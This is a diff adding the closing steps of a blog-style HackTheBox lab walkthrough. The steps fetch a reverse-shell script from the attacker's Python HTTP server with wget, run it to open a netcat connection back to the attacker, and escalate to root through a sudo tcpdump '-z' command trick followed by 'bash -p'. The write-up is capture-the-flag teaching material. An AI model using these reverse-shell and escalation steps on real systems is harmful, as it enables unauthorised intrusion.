@@ -85,3 +85,33 @@ Afterward, you'll need to create a bash script (".sh") in the "/dev/shm/" direct
 
 
 In my case, to bring the bash script to the web shell, I created a Python server: `python -m http.server 80`. Then, in the web page's shell, you'll need to use `wget` to access your HackTheBox IP address and navigate to `/dev/shm/reverse.sh`.
+
+Verify that the reverse.sh file transfer has been completed on the Python server
+```bash
+10.10.11.59 - - [22/Dec/2025 20:35:21] "GET /shell.sh HTTP/1.1" 200 -
+```
+Now check in the shell that the file has been transferred by typing `ls /dev/shm/` and the file should appear.
+Run it using `bash /dev/shm/reverse.sh` and netcat should establish the connection between your terminal and the victim machine.
+
+After that, you will log in as the Tomcat user, and you will have to escalate to the James user where you will get the first user flag, and then you will have to escalate privileges to root with tcpdump. These are the commands you will have to use:
+
+```bash
+COMMAND='id'
+
+TF=$(mktemp)
+
+echo "$COMMAND" > $TF
+
+chmod +x $TF
+
+sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+```
+After entering those five commands one by one, you'll need to enter a command to log as root. The command to gain root access is "bash -p" (the -p parameter means privilege).
+
+## 📝 Final Review:
+And that's it. This isn't so much a write-up as it is a superficial guide on how to complete the machine. There are parts where you have to look up the details or ask yourself why something is used, or why the decision was made to use tcpdump. Completing the machines just to get the flag isn't worthwhile, which is why I'm writing the guide this way. I'm not writing everything out, but I'm giving hints.
+
+I found the machine somewhat complicated, but not as difficult as Eighteen. For being in the Medium category, it wasn't too hard.
+
+
+
